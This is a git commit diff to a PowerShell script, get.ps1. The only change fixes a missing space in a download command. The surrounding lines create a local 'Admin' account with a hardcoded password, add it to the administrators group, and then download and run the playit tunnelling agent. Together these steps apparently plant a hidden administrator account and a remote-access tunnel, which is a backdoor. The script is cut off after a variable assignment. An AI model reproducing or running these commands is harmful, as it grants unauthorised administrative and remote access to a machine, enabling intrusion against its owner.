4af5f78832bd3bc8bc68dafd2438f9f47f30c913
Usser1222 <163659668+Usser1222@users.noreply.github.com>
2024-03-16 18:48:16 +0300

    g

--- get.ps1
+++ get.ps1
@@ -1,7 +1,7 @@
 cmd /c net user /add Admin P@ssw0rd.
 cmd /c net localgroup /add administrators Admin
 
-Invoke-WebRequesthttps://github.com/playit-cloud/playit-agent/releases/download/v0.15.13/playit-windows-x86_64-signed.msi -OutFile playit.msi
+Invoke-WebRequest https://github.com/playit-cloud/playit-agent/releases/download/v0.15.13/playit-windows-x86_64-signed.msi -OutFile playit.msi
 ./playit.msi
 
 $i = 10000000
